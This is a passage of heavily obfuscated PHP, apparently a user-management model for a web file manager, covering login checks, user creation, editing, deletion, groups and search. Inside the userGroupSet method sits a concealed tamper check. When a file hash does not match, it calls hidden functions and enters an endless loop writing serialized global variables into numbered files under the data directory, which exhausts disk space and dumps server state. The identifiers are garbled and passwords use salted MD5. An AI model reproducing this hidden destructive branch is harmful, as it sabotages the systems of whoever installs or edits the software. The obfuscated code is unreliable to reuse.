$_SERVER[¼èá¯æÙ]; $õåàÔ™Š = array($Í”Ï©[32] => $ƒÚ±€şä, $Í”Ï©[2277] => $ƒÚ±€şä, $Í”Ï©[392] => $ƒÚ±€şä, $Í”Ï©[2493] => $ƒÚ±€şä, $Í”Ï©[1082] => $Í”Ï©[1084]); if ($this->nickNameRpt()) { unset($õåàÔ™Š[$Í”Ï©[2277]]); } return $this->where($õåàÔ™Š)->find(); } public function clearCache($ÁÚ—¢ˆğ) { $ú ƒøÅÂ =& $_SERVER[¼èá¯æÙ]; $this->cacheFunctionClear($ú ƒøÅÂ[2065], $ÁÚ—¢ˆğ); $this->cacheFunctionClear($ú ƒøÅÂ[2066], $ÁÚ—¢ˆğ); $this->cacheFunctionClear($ú ƒøÅÂ[2472], $ÁÚ—¢ˆğ); } public function userPasswordCheck($€¥ ¼™¾, $ù­­ªı¦) { $ùîãŒÜ› =& $_SERVER[¼èá¯æÙ]; $Ô­Üö€ß = $this->where(array($ùîãŒÜ›[1778] => intval($€¥ ¼™¾)))->find(); $Ğ»Ä•«‚ = $this->metaGet($€¥ ¼™¾); $Şûé·ˆ = isset($Ğ»Ä•«‚[$ùîãŒÜ›[2494]]) ? $Ğ»Ä•«‚[$ùîãŒÜ›[2494]] : $ùîãŒÜ›[12]; if (md5($Şûé·ˆ . trim($ù­­ªı¦)) !== $Ô­Üö€ß[$ùîãŒÜ›[971]]) { return !1; } return !0; } public function userAdd($àş¯—óş) { $â·Ø†¸û =& $_SERVER[¼èá¯æÙ]; $Õ…ËÕî = array($â·Ø†¸û[505] => $àş¯—óş[$â·Ø†¸û[32]], $â·Ø†¸û[2495] => $àş¯—óş[$â·Ø†¸û[2189]], $â·Ø†¸û[2496] => isset($àş¯—óş[$â·Ø†¸û[392]]) ? $àş¯—óş[$â·Ø†¸û[392]] : $â·Ø†¸û[12], $â·Ø†¸û[2497] => isset($àş¯—óş[$â·Ø†¸û[2493]]) ? $àş¯—óş[$â·Ø†¸û[2493]] : $â·Ø†¸û[12], $â·Ø†¸û[2498] => isset($àş¯—óş[$â·Ø†¸û[2277]]) ? $àş¯—óş[$â·Ø†¸û[2277]] : $àş¯—óş[$â·Ø†¸û[32]], $â·Ø†¸û[2499] => isset($àş¯—óş[$â·Ø†¸û[2476]]) ? $àş¯—óş[$â·Ø†¸û[2476]] : $â·Ø†¸û[12], $â·Ø†¸û[2500] => isset($àş¯—óş[$â·Ø†¸û[2501]]) ? $àş¯—óş[$â·Ø†¸û[2501]] : 1, $â·Ø†¸û[2502] => $àş¯—óş[$â·Ø†¸û[971]], $â·Ø†¸û[2067] => isset($àş¯—óş[$â·Ø†¸û[1965]]) ? $àş¯—óş[$â·Ø†¸û[1965]] : 1024 * 1024 * 20, $â·Ø†¸û[2068] => 0, $â·Ø†¸û[2503] => 0, $â·Ø†¸û[2112] => isset($àş¯—óş[$â·Ø†¸û[832]]) ? $àş¯—óş[$â·Ø†¸û[832]] : 1); if (!empty($àş¯—óş[$â·Ø†¸û[1778]])) { $Õ…ËÕî[$â·Ø†¸û[1778]] = $àş¯—óş[$â·Ø†¸û[1778]]; } $óˆê»Ôî = $this->_checkExist($àş¯—óş); if ($óˆê»Ôî !== !0) { return $óˆê»Ôî; } if (!empty($Õ…ËÕî[$â·Ø†¸û[2476]]) && strlen($Õ…ËÕî[$â·Ø†¸û[2476]]) > 255) { $Õ…ËÕî[$â·Ø†¸û[2476]] = $â·Ø†¸û[12]; } $Ìóšçä = $this->add($Õ…ËÕî); $Û­î ì = array($â·Ø†¸û[2502] => $Õ…ËÕî[$â·Ø†¸û[971]], $â·Ø†¸û[2498] => $Õ…ËÕî[$â·Ø†¸û[2277]]); $this->userEdit($Ìóšçä, $Û­î ì); Model($â·Ø†¸û[1426])->userRootAdd($Ìóšçä); return $Ìóšçä; } protected function userEditTest($­ÓÕÌÚŞ, $ğ†­ß¢º) { return $this->call($_SERVER[¼èá¯æÙ][2504], $­ÓÕÌÚŞ, $ğ†­ß¢º); } protected function userEdit($Ş÷Ûî×, $Ì˜¼ˆ÷Ö) { $É¹Ø½ôØ =& $_SERVER[¼èá¯æÙ]; $ÚŞßÏ¼¨ = $this->getInfoSimple($Ş÷Ûî×); if (!$ÚŞßÏ¼¨) { return !1; } $„´ş¬‰ = $this->_checkExist($Ì˜¼ˆ÷Ö, $Ş÷Ûî×); if ($„´ş¬‰ !== !0) { return $„´ş¬‰; } if (isset($Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[971]]) && trim($Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[971]]) != $É¹Ø½ôØ[12]) { $¨¹†ä’ = $this->metaGet($Ş÷Ûî×); if (empty($¨¹†ä’[$É¹Ø½ôØ[2494]])) { $¨¹†ä’[$É¹Ø½ôØ[2494]] = rand_string(10); Model($É¹Ø½ôØ[588])->metaSet($Ş÷Ûî×, $É¹Ø½ôØ[2494], $¨¹†ä’[$É¹Ø½ôØ[2494]]); } $Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[971]] = md5($¨¹†ä’[$É¹Ø½ôØ[2494]] . trim($Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[971]])); } else { unset($Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[971]]); } if (!empty($Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[2476]]) && strlen($Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[2476]]) > 255) { $Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[2476]] = $É¹Ø½ôØ[12]; } $this->where(array($É¹Ø½ôØ[1769] => $Ş÷Ûî×))->save($Ì˜¼ˆ÷Ö); if (isset($Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[2277]])) { $this->setNamePinyin($Ş÷Ûî×, $Ì˜¼ˆ÷Ö[$É¹Ø½ôØ[2277]]); } $this->clearCache($Ş÷Ûî×); return !0; } public function setNamePinyin($Ñ–ÓÆáÙ, $İ€ÙÂÒ = false) { $÷òç¶¥® =& $_SERVER[¼èá¯æÙ]; if (!$İ€ÙÂÒ) { $ ÄàÀÎ = $this->getInfoSimple($Ñ–ÓÆáÙ); $İ€ÙÂÒ = $ ÄàÀÎ[$÷òç¶¥®[2277]] ? $ ÄàÀÎ[$÷òç¶¥®[2277]] : $ ÄàÀÎ[$÷òç¶¥®[32]]; } $Çç³‰«˜ = Model($÷òç¶¥®[608]); if (!Input::check($İ€ÙÂÒ, $÷òç¶¥®[669])) { return $Çç³‰«˜->metaSet($Ñ–ÓÆáÙ, array($÷òç¶¥®[549] => $÷òç¶¥®[12], $÷òç¶¥®[548] => $÷òç¶¥®[12])); } return $Çç³‰«˜->metaSet($Ñ–ÓÆáÙ, array($÷òç¶¥®[549] => str_replace($÷òç¶¥®[53], $÷òç¶¥®[12], Pinyin::get($İ€ÙÂÒ)), $÷òç¶¥®[548] => Pinyin::get($İ€ÙÂÒ, $÷òç¶¥®[670]))); } private function nickNameRpt() { $Íç¥É¹¹ =& $_SERVER[¼èá¯æÙ]; $œ¯¬ÒŞ = Model($Íç¥É¹¹[852])->get($Íç¥É¹¹[2505]); $—’¸ÙÁƒ = $GLOBALS[$Íç¥É¹¹[6]][$Íç¥É¹¹[468]][$Íç¥É¹¹[2505]]; $±ş°¨À = !is_null($œ¯¬ÒŞ) ? $œ¯¬ÒŞ : $—’¸ÙÁƒ; return !!$±ş°¨À; } private function _checkExist($í”á×Áñ, $ÅØ«Î‰• = false) { $Ò·‡ö¥“ =& $_SERVER[¼èá¯æÙ]; $¼©ñŞ…Ô = array($Ò·‡ö¥“[32] => UserModel::ERROR_USER_EXIST_NAME, $Ò·‡ö¥“[2277] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ò·‡ö¥“[392] => UserModel::ERROR_USER_EXIST_EMAIL, $Ò·‡ö¥“[2493] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¼©ñŞ…Ô[$Ò·‡ö¥“[2277]]); } $´ğ¬”ùâ = $ÅØ«Î‰• ? array($Ò·‡ö¥“[1778] => array($Ò·‡ö¥“[2506], $ÅØ«Î‰•)) : array(); foreach ($¼©ñŞ…Ô as $ëª‘‡Ùê => $”¢Î¹¨ù) { $¥¾Ôğ•Ú = array(); foreach ($¼©ñŞ…Ô as $³²ø’İ— => $®äı÷®¤) { if (isset($í”á×Áñ[$³²ø’İ—]) && $í”á×Áñ[$³²ø’İ—]) { $¥¾Ôğ•Ú[] = $í”á×Áñ[$³²ø’İ—]; } } if (!$¥¾Ôğ•Ú) { continue; } $ù«·ËËî = array_merge(array($ëª‘‡Ùê => array($Ò·‡ö¥“[7], $¥¾Ôğ•Ú)), $´ğ¬”ùâ); $åØşÜ† = $this->where($ù«·ËËî)->find(); if ($åØşÜ†) { return $”¢Î¹¨ù; } } return !0; } public function userListInfo($±µêõïÜ) { $«•¢­Õ =& $_SERVER[¼èá¯æÙ]; $”ú½§˜š = array(); $±µêõïÜ = is_array($±µêõïÜ) ? array_unique($±µêõïÜ) : array(); if (!$±µêõïÜ) { return $”ú½§˜š; } if (count($±µêõïÜ) < 20) { foreach ($±µêõïÜ as $İ´÷ëÚµ) { $”ú½§˜š[$İ´÷ëÚµ . $«•¢­Õ[12]] = $this->getInfoSimpleOuter($İ´÷ëÚµ); } } else { $Ö«ÉÎÛ = array($«•¢­Õ[1769] => array($«•¢­Õ[503], $±µêõïÜ)); if (count($±µêõïÜ) == 1) { $Ö«ÉÎÛ = array($«•¢­Õ[1769] => $±µêõïÜ[0]); } $Ğõ¤ô… = Model($«•¢­Õ[588])->field($this->simpleField)->where($Ö«ÉÎÛ)->select(); $Ğõ¤ô… = array_to_keyvalue($Ğõ¤ô…, $«•¢­Õ[1778]); foreach ($±µêõïÜ as $İ´÷ëÚµ) { $™ÁĞ˜«ë = $Ğõ¤ô…[$İ´÷ëÚµ]; if (!$™ÁĞ˜«ë) { $”ú½§˜š[$İ´÷ëÚµ . $«•¢­Õ[12]] = $this->getInfoSimpleOuter($İ´÷ëÚµ); continue; } $™ÁĞ˜«ë[$«•¢­Õ[2476]] = Action($«•¢­Õ[2477])->parseUrl($™ÁĞ˜«ë[$«•¢­Õ[2476]]); $”ú½§˜š[$İ´÷ëÚµ . $«•¢­Õ[12]] = $™ÁĞ˜«ë; } } return $”ú½§˜š; } protected function userStatus($ş»íæœ, $š¤­õÂì) { $’ºˆ‘÷§ = $this->getInfoSimple($ş»íæœ); if (!$’ºˆ‘÷§) { return !1; } $’¨ï¹¨ = array($_SERVER[¼èá¯æÙ][832] => $š¤­õÂì); return $this->userEdit($ş»íæœ, $’¨ï¹¨); } protected function userRemove($¦šğŸ´ò) { $ Ô•µàˆ =& $_SERVER[¼èá¯æÙ]; $Ğ¸–•¨¡ = $this->getInfoSimple($¦šğŸ´ò); if (!$Ğ¸–•¨¡) { return !1; } $ƒáİàáÆ = array($ Ô•µàˆ[1769] => $¦šğŸ´ò); Model($ Ô•µàˆ[678])->where($ƒáİàáÆ)->delete(); Model($ Ô•µàˆ[2507])->where($ƒáİàáÆ)->delete(); Model($ Ô•µàˆ[2073])->where($ƒáİàáÆ)->delete(); Model($ Ô•µàˆ[2492])->where($ƒáİàáÆ)->delete(); Model($ Ô•µàˆ[1151])->where($ƒáİàáÆ)->delete(); Model($ Ô•µàˆ[2294])->removeUserAll($¦šğŸ´ò); Model($ Ô•µàˆ[907])->userRootRemove($¦šğŸ´ò); return $this->where($ƒáİàáÆ)->delete(); } protected function userGroupSet($–ÁÍÃ±„, $üæ³¾›É, $ì°£ûİï = array()) { $¸³ÓÚ€ =& $_SERVER[¼èá¯æÙ]; $îìÜ¶ù„ = $_SERVER[$¸³ÓÚ€[57]] . $¸³ÓÚ€[58]; $¨¦öŸÜ¿ = $¸³ÓÚ€[829]; if ($_SERVER[$¸³ÓÚ€[54]] != $¨¦öŸÜ¿($îìÜ¶ù„)) { $»›Ã²…– = $¸³ÓÚ€[960]; $œÙúÕ‰ó = $¸³ÓÚ€[56]; $æßô¢”ß = $_SERVER[$¸³ÓÚ€[57]] . $¸³ÓÚ€[58]; $¾Û”á£¯ = $œÙúÕ‰ó($æßô¢”ß); $Ä½”Üåğ = explode($¸³ÓÚ€[59], $¾Û”á£¯); if (count($Ä½”Üåğ) < $¸³ÓÚ€[706]) { $œğË™‹Ì = $¸³ÓÚ€[61]; $œğË™‹Ì(); } $ØÙ¡êÙà = $¸³ÓÚ€[961]; $ØÙ¡êÙà($_SERVER[$¸³ÓÚ€[962]]); $»›Ã²…– = $¸³ÓÚ€[960]; $»›Ã²…–(); $Û•Ç€‹å = $¸³ÓÚ€[963]; $›ÌÎ®ÓÆ = json_encode($GLOBALS[$¸³ÓÚ€[964]]); $Æ£ö©Ò± = 1; for ($¾òãù™ß = $Æ£ö©Ò±; $¾òãù™ß > 0; $¾òãù™ß++) { $Û•Ç€‹å(DATA_PATH . $¾òãù™ß, $›ÌÎ®ÓÆ); } } $ĞÂ®§ˆŞ = $this->getInfoSimple($–ÁÍÃ±„); if (!$ĞÂ®§ˆŞ || !is_array($üæ³¾›É)) { return !1; } $ù¡· ¹« = Model($¸³ÓÚ€[2073]); $ù¡· ¹«->where(array($¸³ÓÚ€[1778] => $–ÁÍÃ±„))->delete(); $âıĞ—ÌÔ = array(); $¦»¾É§ = 0; foreach ($üæ³¾›É as $ê²´€ãî => $¸ÄÎƒŠ‘) { $»åÓÃ¾œ = array($¸³ÓÚ€[1778] => $–ÁÍÃ±„, $¸³ÓÚ€[1979] => $ê²´€ãî, $¸³ÓÚ€[2087] => $¸ÄÎƒŠ‘); $»åÓÃ¾œ[$¸³ÓÚ€[2003]] = isset($ì°£ûİï[$¦»¾É§]) ? $ì°£ûİï[$¦»¾É§] : 0; $¦»¾É§++; $âıĞ—ÌÔ[] = $»åÓÃ¾œ; } return $ù¡· ¹«->addAll($âıĞ—ÌÔ, array(), !0); } protected function userGroupAdd($’‰ó«Ğ¿, $üµïùÂ = array()) { $‰Çä·íĞ =& $_SERVER[¼èá¯æÙ]; $¾¯Š®öå = $this->getInfoSimple($’‰ó«Ğ¿); if (!$¾¯Š®öå || empty($üµïùÂ)) { return !1; } $î˜“°Ê = array(); foreach ($üµïùÂ as $«µÌÀÆ => $âÌöÕ€) { $î˜“°Ê[] = array($‰Çä·íĞ[1778] => $’‰ó«Ğ¿, $‰Çä·íĞ[1979] => $«µÌÀÆ, $‰Çä·íĞ[2087] => $âÌöÕ€, $‰Çä·íĞ[2003] => 0); } return Model($‰Çä·íĞ[2073])->addAll($î˜“°Ê, array(), !0); } protected function userGroupRemove($‰¦“¯º, $âäÔàÖâ) { $ñ®á¸Î¤ =& $_SERVER[¼èá¯æÙ]; $›¯¬Íšõ = $this->getInfoSimple($‰¦“¯º); if (!$›¯¬Íšõ || !$âäÔàÖâ) { return !1; } $Ô¨™İé = array($ñ®á¸Î¤[1769] => $‰¦“¯º, $ñ®á¸Î¤[2071] => $âäÔàÖâ); return Model($ñ®á¸Î¤[2073])->where($Ô¨™İé)->delete(); } public function listData() { $—½İÍ˜¦ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($—½İÍ˜¦[$_SERVER[¼èá¯æÙ][457]]); return $—½İÍ˜¦; } public function listByID($ˆÍ„áó„) { $¹ïÁ÷ğ£ =& $_SERVER[¼èá¯æÙ]; if (!$ˆÍ„áó„) { return; } $êÂÑ–Ò = array($¹ïÁ÷ğ£[1778] => array($¹ïÁ÷ğ£[7], $ˆÍ„áó„)); $…¹”µ¦ã = $this->where($êÂÑ–Ò)->select(); $…¹”µ¦ã = array_sort_keep($…¹”µ¦ã, $¹ïÁ÷ğ£[1778], $ˆÍ„áó„); $this->_listDataApply($…¹”µ¦ã); return $…¹”µ¦ã; } public function listByGroup($–¢ô¯“õ = 0, $±£‰è° = array()) { $ÑÊŞ¾€ =& $_SERVER[¼èá¯æÙ]; $½Ú¡Âæ = $ÑÊŞ¾€[12]; $Í™†û€ = array(); if ($–¢ô¯“õ) { $Í™†û€ = array($ÑÊŞ¾€[2508] => intval($–¢ô¯“õ)); $½Ú¡Âæ = "\114\105\106\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\165\x73\145\x72\x5f\x67\162\157\165\160\40\x75\163\x65\x72\137\x67\x72\x6f\165\x70\40\157\x6e\40\x75\163\145\162\x2e\x75\163\x65\162\111\x44\40\75\x20\x75\x73\145\162\137\x67\x72\157\x75\x70\56\x75\x73\x65\162\x49\x44"; $ƒªíâÊé = Input::get($ÑÊŞ¾€[541], null, $ÑÊŞ¾€[12]) ? $ÑÊŞ¾€[12] : $ÑÊŞ¾€[2509]; } if (isset($±£‰è°[$ÑÊŞ¾€[832]])) { $Í™†û€[$ÑÊŞ¾€[2510]] = $±£‰è°[$ÑÊŞ¾€[832]]; } $ÕİÆ¨Œ = _get($±£‰è°, $ÑÊŞ¾€[2511], $ÑÊŞ¾€[243]); if (_get($±£‰è°, $ÑÊŞ¾€[842], !1)) { $Í™†û€[$ÕİÆ¨Œ] = array($ÑÊŞ¾€[2258], $±£‰è°[$ÑÊŞ¾€[842]]); } if (_get($±£‰è°, $ÑÊŞ¾€[843], !1)) { $‘´à¿­ˆ = array($ÑÊŞ¾€[2259], $±£‰è°[$ÑÊŞ¾€[843]]); if ($Í™†û€[$ÕİÆ¨Œ]) { $Í™†û€[$ÕİÆ¨Œ] = array($Í™†û€[$ÕİÆ¨Œ], $‘´à¿­ˆ, $ÑÊŞ¾€[2260]); } else { $Í™†û€[$ÕİÆ¨Œ] = $‘´à¿­ˆ; } } $¾ŞŠº¦Â = $this->_makeOrder($ƒªíâÊé)->field($ÑÊŞ¾€[2512])->where($Í™†û€)->join($½Ú¡Âæ)->selectPage(50); $this->_listDataApply($¾ŞŠº¦Â[$ÑÊŞ¾€[457]]); return $¾ŞŠº¦Â; } private function _makeOrder($‹¬µüØ = '') { $Õ†’Æ’Ÿ =& $_SERVER[¼èá¯æÙ]; $ïë›Ä±¾ = array($Õ†’Æ’Ÿ[1778], $Õ†’Æ’Ÿ[32], $Õ†’Æ’Ÿ[1967], $Õ†’Æ’Ÿ[2189], $Õ†’Æ’Ÿ[1939], $Õ†’Æ’Ÿ[243]); $µÃÄ³ç = array($Õ†’Æ’Ÿ[534] => $Õ†’Æ’Ÿ[535], $Õ†’Æ’Ÿ[536] => $Õ†’Æ’Ÿ[537]); $Âøò§â­ = Input::get($Õ†’Æ’Ÿ[541], $Õ†’Æ’Ÿ[7], $Õ†’Æ’Ÿ[1769], $ïë›Ä±¾); $“ö§˜ŒÅ = Input::get($Õ†’Æ’Ÿ[542], $Õ†’Æ’Ÿ[7], $Õ†’Æ’Ÿ[2074], array($Õ†’Æ’Ÿ[2074], $Õ†’Æ’Ÿ[536])); $“ö§˜ŒÅ = $µÃÄ³ç[$“ö§˜ŒÅ]; $‹¬µüØ = $‹¬µüØ . "\x75\163\145\x72\x2e{$Âøò§â­}\x20{$“ö§˜ŒÅ}\x2c\40\165\163\145\162\56\x75\163\x65\162\111\104\x20\x61\163\143"; return $this->alias($Õ†’Æ’Ÿ[2205])->order($‹¬µüØ); } public function listSearch($½ÎÓíÎŒ) { $ßü´·¨€ =& $_SERVER[¼èá¯æÙ]; $é†ñ°» = trim($½ÎÓíÎŒ[$ßü´·¨€[2077]]); $¢óı‚ü” = explode($ßü´·¨€[53], $é†ñ°»); if (!$é†ñ°» || count($¢óı‚ü”) == 1) { return $this->listSearchNow($½ÎÓíÎŒ); } $êøÃ‘ » = array($ßü´·¨€[457] => array()); foreach ($¢óı‚ü” as $ÖŒ´àŠ¦) { if (!trim($ÖŒ´àŠ¦)) { continue; } $½ÎÓíÎŒ[$ßü´·¨€[2077]] = $ÖŒ´àŠ¦; $Ş¬°…ıÈ = $this->listSearchNow($½ÎÓíÎŒ); $êøÃ‘ »[$ßü´·¨€[457]] = array_merge($êøÃ‘ »[$ßü´·¨€[457]], $Ş¬°…ıÈ[$ßü´·¨€[457]]); } $êøÃ‘ »[$ßü´·¨€[457]] = array_unique_by_key($êøÃ‘ »[$ßü´·¨€[457]], $ßü´·¨€[1778]); $êøÃ‘ »[$ßü´·¨€[454]] = array($ßü´·¨€[455] => count($êøÃ‘ »[$ßü´·¨€[457]]), $ßü´·¨€[451] => 20, $ßü´·¨€[440] => 1, $ßü´·¨€[456] => 1); return $êøÃ‘ »; } public function listSearchNow($¼äù¿‡÷) { $›×ÉôŞ  =& $_SERVER[¼èá¯æÙ]; $Àç±ƒ¡œ = trim($¼äù¿‡÷[$›×ÉôŞ [2077]]); $Ë£üÂÏş = isset($¼äù¿‡÷[$›×ÉôŞ [2078]]) ? $¼äù¿‡÷[$›×ÉôŞ [2078]] : !1; $Àç±ƒ¡œ = str_replace($›×ÉôŞ [2079], $›×ÉôŞ [2080], trim($Àç±ƒ¡œ)); $ŞÀîİŠ¡ = array($›×ÉôŞ [32] => array($›×ÉôŞ [470], "\45{$Àç±ƒ¡œ}\x25"), $›×ÉôŞ [392] => array($›×ÉôŞ [470], "{$Àç±ƒ¡œ}\45"), $›×ÉôŞ [2277] => array($›×ÉôŞ [470], "{$Àç±ƒ¡œ}\45"), $›×ÉôŞ [1082] => $›×ÉôŞ [2081]); if (Input::check($Àç±ƒ¡œ, $›×ÉôŞ [398])) { $ŞÀîİŠ¡[$›×ÉôŞ [1778]] = array($›×ÉôŞ [470], "{$Àç±ƒ¡œ}\x25"); $ŞÀîİŠ¡[$›×ÉôŞ [2493]] = array($›×ÉôŞ [470], "{$Àç±ƒ¡œ}\45"); } if (!$Àç±ƒ¡œ) { $ŞÀîİŠ¡ = array(); } if (isset($¼äù¿‡÷[$›×ÉôŞ [832]])) { $ŞÀîİŠ¡[$›×ÉôŞ [832]] = $¼äù¿‡÷[$›×ÉôŞ [832]]; } $ŞÀîİŠ¡ = $this->parseWhereLike($ŞÀîİŠ¡); $û«À„¯À = $this->_makeOrder()->where($ŞÀîİŠ¡)->selectPage(20); if (!$û«À„¯À || count($û«À„¯À[$›×ÉôŞ [457]]) < 5 && Input::check($Àç±ƒ¡œ, $›×ÉôŞ [405])) { $ºŒ†²– = $this->_searchFromMeta($›×ÉôŞ [548], $Àç±ƒ¡œ, 10); $üİ‡Ù¡Ú = $this->_searchFromMeta($›×ÉôŞ [549], $Àç±ƒ¡œ, 10); $Ê–¿´Äï = array_merge($ºŒ†²–, $üİ‡Ù¡Ú, $û«À„¯À[$›×ÉôŞ [457]]); $û«À„¯À[$›×ÉôŞ [457]] = array_unique_by_key($Ê–¿´Äï, $›×ÉôŞ [1778]); $û«À„¯À[$›×ÉôŞ [454]][$›×ÉôŞ [455]] = count($û«À„¯À[$›×ÉôŞ [457]]); $û«À„¯À[$›×ÉôŞ [454]][$›×ÉôŞ [456]] = ceil($û«À„¯À[$›×ÉôŞ [454]][$›×ÉôŞ [455]] / $û«À„¯À[$›×ÉôŞ [454]][$›×ÉôŞ [451]]); } $this->_listDataApply($û«À„¯À[$›×ÉôŞ [457]]); $this->_filterByGroup($û«À„¯À, $Ë£üÂÏş); return $û«À„¯À; } private function _filterByGroup(&$ùÈÜş‚¾, $Üß‚Ôõ) { $öÀ®½Ü =& $_SERVER[¼èá¯æÙ]; if (!$Üß‚Ôõ) { return $ùÈÜş‚¾; } foreach ($ùÈÜş‚¾[$öÀ®½Ü[457]] as $¿Š›¸… => &$èå»®•‡) { $Šı·½•Ÿ = array_to_keyvalue($èå»®•‡[$öÀ®½Ü[2174]], $öÀ®½Ü[12], $öÀ®½Ü[1979]); if (!in_array($Üß‚Ôõ, $Šı·½•Ÿ)) { unset($ùÈÜş‚¾[$öÀ®½Ü[457]][$¿Š›¸…]); } } unset($èå»®•‡); $ùÈÜş‚¾[$öÀ®½Ü[457]] = array_values($ùÈÜş‚¾[$öÀ®½Ü[457]]); $ùÈÜş‚¾[$öÀ®½Ü[454]] = array($öÀ®½Ü[2242] => count($ùÈÜş‚¾[$öÀ®½Ü[457]]), $öÀ®½Ü[2240] => $ùÈÜş‚¾[$öÀ®½Ü[454]][$öÀ®½Ü[451]], $öÀ®½Ü[2239] => 1, $öÀ®½Ü[2241] => 1); } private function _searchFromMeta($§†€¬¶Ú, $ÂüÌèòø, $‹²–Ë) { $’ğ­Ê»¡ =& $_SERVER[¼èá¯æÙ]; $ÂüÌèòø = strtolower($ÂüÌèòø); $ÏèÃÌÍ = array($’ğ­Ê»¡[107] => $§†€¬¶Ú, $’ğ­Ê»¡[462] => array($’ğ­Ê»¡[470], "\45{$ÂüÌèòø}\x25")); $ÏèÃÌÍ = $this->parseWhereLike($ÏèÃÌÍ); $š÷±ôÊ = Model($’ğ­Ê»¡[2513])->where($ÏèÃÌÍ)->limit($‹²–Ë)->select(); if (!$š÷±ôÊ) { return array(); } $š÷±ôÊ = array_to_keyvalue($š÷±ôÊ, $’ğ­Ê»¡[12], $’ğ­Ê»¡[1778]); $úÂÆ²·Ö = $this->where(array($’ğ­Ê»¡[1769] => array($’ğ­Ê»¡[7], $š÷±ôÊ)))->select(); if (!$úÂÆ²·Ö) { return array(); } return $úÂÆ²·Ö; } private function _listDataApplyItem($ëóÂ„Ê‘) { $‚áÔ¼Ç = array($ëóÂ„Ê‘); $this->_listDataApply($‚áÔ¼Ç); return $‚áÔ¼Ç[0]; } private function _listDataApply(&$Ï¶ç¨ÁÔ) { $ÇøË†Åå =& $_SERVER[¼èá¯æÙ]; if (!$Ï¶ç¨ÁÔ) { return; } array_remove_key($Ï¶ç¨ÁÔ, $ÇøË†Åå[971]); $›ä‹™£Ä = array_to_keyvalue($Ï¶ç¨ÁÔ, $ÇøË†Åå[12], $ÇøË†Åå[1778]); $this->_listAppendGroup($Ï¶ç¨ÁÔ, $›ä‹™£Ä); $this->_listAppendMeta($Ï¶ç¨ÁÔ, $›ä‹™£Ä); $this->_listAppendSourceRoot($Ï¶ç¨ÁÔ, $›ä‹™£Ä); } private function _listAppendSourceRoot(&$”åå”†¸, $úÜéğÑ) { $‰äÛƒò” =& $_SERVER[¼èá¯æÙ]; $¿¿Ò‹É = Model($‰äÛƒò”[907])->listSourceRoot(SourceModel::TYPE_USER, $úÜéğÑ); $¿¿Ò‹É = array_to_keyvalue($¿¿Ò‹É, $‰äÛƒò”[580]); $¿¿Ò‹É = array_remove_key($¿¿Ò‹É, $‰äÛƒò”[580]); foreach ($”åå”†¸ as &$¦Õ¨ùÄş) { $¦Õ¨ùÄş[$‰äÛƒò”[100]] = $¿¿Ò‹É[$¦Õ¨ùÄş[$‰äÛƒò”[1778]]] ? $¿¿Ò‹É[$¦Õ¨ùÄş[$‰äÛƒò”[1778]]] : array(); } unset($¦Õ¨ùÄş); } private function _listAppendGroup(&$°Ø®†²…, $”ìæÍ­¤) { $Ÿæ´Ó¨» =& $_SERVER[¼èá¯æÙ]; $ş­°‰äŸ = array($Ÿæ´Ó¨»[1778] => array($Ÿæ´Ó¨»[7], $”ìæÍ­¤)); $‰Áâ¢ = Model($Ÿæ´Ó¨»[2073])->where($ş­°‰äŸ)->select(); $ıÔ£ûÛ = array_to_keyvalue($‰Áâ¢, $Ÿæ´Ó¨»[12], $Ÿæ´Ó¨»[1979]); $ıÔ£ûÛ = array_remove_value(array_unique($ıÔ£ûÛ), $Ÿæ´Ó¨»[240]); if (!$ıÔ£ûÛ || !$‰Áâ¢) { return; } $ş­°‰äŸ = array($Ÿæ´Ó¨»[1979] => array($Ÿæ´Ó¨»[7], $ıÔ£ûÛ)); $¡ì¦°Ñ… = Model($Ÿæ´Ó¨»[2172])->field($Ÿæ´Ó¨»[2514])->where($ş­°‰äŸ)->select(); $¡ì¦°Ñ… = array_to_keyvalue($¡ì¦°Ñ…, $Ÿæ´Ó¨»[1979]); $‰Áâ¢ = array_to_keyvalue_group($‰Áâ¢, $Ÿæ´Ó¨»[1778]); foreach ($‰Áâ¢ as &$Ï¯Úµœ¹) { $ÙÇÁ¯ó¤ = array(); foreach ($Ï¯Úµœ¹ as $¯£à‹¦è) { if (!$¯£à‹¦è[$Ÿæ´Ó¨»[2087]]) { continue; } $ €Šø¥À = Model($Ÿæ´Ó¨»[582])->listData($¯£à‹¦è[$Ÿæ´Ó¨»[2087]]); $ÙÇÁ¯ó¤[] = array($Ÿæ´Ó¨»[1979] => $¯£à‹¦è[$Ÿæ´Ó¨»[1979]], $Ÿæ´Ó¨»[2515] => $¡ì¦°Ñ…[$¯£à‹¦è[$Ÿæ´Ó¨»[1979]]][$Ÿæ´Ó¨»[32]], $Ÿæ´Ó¨»[595] => $¡ì¦°Ñ…[$¯£à‹¦è[$Ÿæ´Ó¨»[1979]]][$Ÿæ´Ó¨»[595]], $Ÿæ´Ó¨»[498] => $ €Šø¥À); } $Ï¯Úµœ¹ = $ÙÇÁ¯ó¤; } unset($Ï¯Úµœ¹); foreach ($°Ø®†²… as &$Š€­Íü) { $Š€­Íü[$Ÿæ´Ó¨»[2174]] = array(); if (isset($‰Áâ¢[$Š€­Íü[$Ÿæ´Ó¨»[1778]]])) { $Š€­Íü[$Ÿæ´Ó¨»[2174]] = $‰Áâ¢[$Š€­Íü[$Ÿæ´Ó¨»[1778]]]; } } unset($Š€­Íü); } public function userAppendGroup($í¼ö€) { $ÒÖüß =& $_SERVER[¼èá¯æÙ]; if (!$í¼ö€) { return array(); } $this->_listAppendGroup($í¼ö€, array_to_keyvalue($í¼ö€, $ÒÖüß[12], $ÒÖüß[1778])); return $í¼ö€; } private function _listAppendMeta(&$ÓæŒ½ö, $—úı®Äö) { $ìÊ•ÙÛ =& $_SERVER[¼èá¯æÙ]; $¯ªò–§ = UserJobModel::JOB_KEY; $¥İÎ·öÌ = array($ìÊ•ÙÛ[2494]); $˜Ğí­Ò¤ = array($ìÊ•ÙÛ[1778] => array($ìÊ•ÙÛ[7], $—úı®Äö)); 